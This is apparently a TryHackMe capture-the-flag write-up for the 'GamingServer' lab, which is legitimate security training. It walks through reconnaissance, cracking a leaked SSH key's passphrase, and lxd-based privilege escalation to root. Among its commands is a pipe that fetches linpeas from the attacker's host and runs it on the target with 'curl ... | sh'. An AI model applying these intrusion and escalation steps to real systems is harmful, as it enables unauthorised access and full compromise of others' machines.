---
title: TryHackMe - GamingServer
layout: post
categories:
- TryHackMe
tag:
- lxd,
- ssh2john,
- security
image: "/assets/img/gamingserver.jpeg"
image_alt: gamingserver
---

An Easy Boot2Root box for beginners. Let's start.

<br>

## 1. Gaming Server

Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

<br>

### 1.1 What is the user flag?

Let's do a nmap scan first.

```
$ nmap -sSCV 10.10.80.114
```

![nmap](/assets/img/tryhackme/gamingserver/nmap.png)

Two ports are open. These are **`22/tcp SSH, and 80/tcp HTTP`**. 
But first, let's check the website running on port 80. 
Here is a page like this.

![home](/assets/img/tryhackme/gamingserver/home.png)

I've been browsing through other links on the site but haven't found anything remarkable. Let's take a look at the source of the page.

![source](/assets/img/tryhackme/gamingserver/source.png)

We found a name here, maybe we can use it for ssh.

We don't have anything else. Let's run a gobuster scan and see what we can find.

```
$ gobuster dir -u http://10.10.225.113  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![gobuster](/assets/img/tryhackme/gamingserver/gobuster.png)

We discovered two directories. Let's see what we can find in these directories.

First I go to the /uploads/ directory.

![uploads](/assets/img/tryhackme/gamingserver/uploads.png)

As you can see, there are 3 files.

dict.lst : It looks like a password list. We can try ssh brute force for John.
  
  - ![dict](/assets/img/tryhackme/gamingserver/dict.png)

Manifesto.txt : Something like a poem or song. Nothing noteworthy.

  - ![manifesto](/assets/img/tryhackme/gamingserver/manifesto.png)

meme.jpg :  :D

  - ![meme](/assets/img/tryhackme/gamingserver/meme.png)

Now let's go to the /secret/ directory and check it out.

![secret](/assets/img/tryhackme/gamingserver/secret.png)

We found a secretKey file, let's see what it says.

![rsa](/assets/img/tryhackme/gamingserver/rsa.png)

Hah, we probably found the RSA key file for john 
We can crack this RSA key and enter ssh with the password we reach.

First, let's copy the secretKey and create the id_rsa file.

![pass](/assets/img/tryhackme/gamingserver/pass.png)

```
$ nano id_rsa
$ ssh2john id_rsa > id_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**`Password: letmein`**

Now we can log in to ssh.

```
$ chmod 600 id_rsa
$ ssh -i id_rsa john@10.10.225.113
```

![in](/assets/img/tryhackme/gamingserver/in.png)

Now we can get to the user flag.

![user-flag](/assets/img/tryhackme/gamingserver/user-flag.png)

<br>

### 1.2 Root.txt

I'm scanning the system with [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/20230319) to upgrade privileges. 

First, I run the following code in the directory where linpeas.sh is located on my own machine.

```
$ sudo python -m http.server 80
```

Then I run the following code on the target machine.

```
$ curl 10.8.86.168/linpeas.sh | sh
```

![run](/assets/img/tryhackme/gamingserver/run.png)

And it worked. Now we're waiting to see if we can find anything useful.

![linpeas](/assets/img/tryhackme/gamingserver/linpeas.png)

I think we found something about lxd. I don't know if I can upgrade authorization using this. So I started researching.  

Yes, I found a way to escalate, let's do it.

```
$ git clone https://github.com/saghul/lxd-alpine-builder
$ cd lxd-alpine-builder
$ ./build-alpine 
```

![alpine](/assets/img/tryhackme/gamingserver/alpine.png)

After building, we need to send one of the `*.tar.gz` files created on our machine to the target machine.

![tar](/assets/img/tryhackme/gamingserver/tar.png)

For this, I run the following code on my own machine.

```
$ python -m http.server 80
```

This code on the target machine:

```
$ wget http://10.8.86.168/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

Then we continue on the target machine.

```
$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
$ lxd init # hepsine enter tıklayıp geç.
$ lxc init myimage mycontainer -c security.privileged=true
$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true 
$ lxc start mycontainer
$ lxc exec mycontainer /bin/sh
```

![privesc](/assets/img/tryhackme/gamingserver/privesc.png)

We can get to the root flag.

```
$ find / -type f -name root.txt 2>/dev/null
$ cat /mnt/root/rot/root.txt
```

![root-flag](/assets/img/tryhackme/gamingserver/root-flag.png)


<br>

---

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
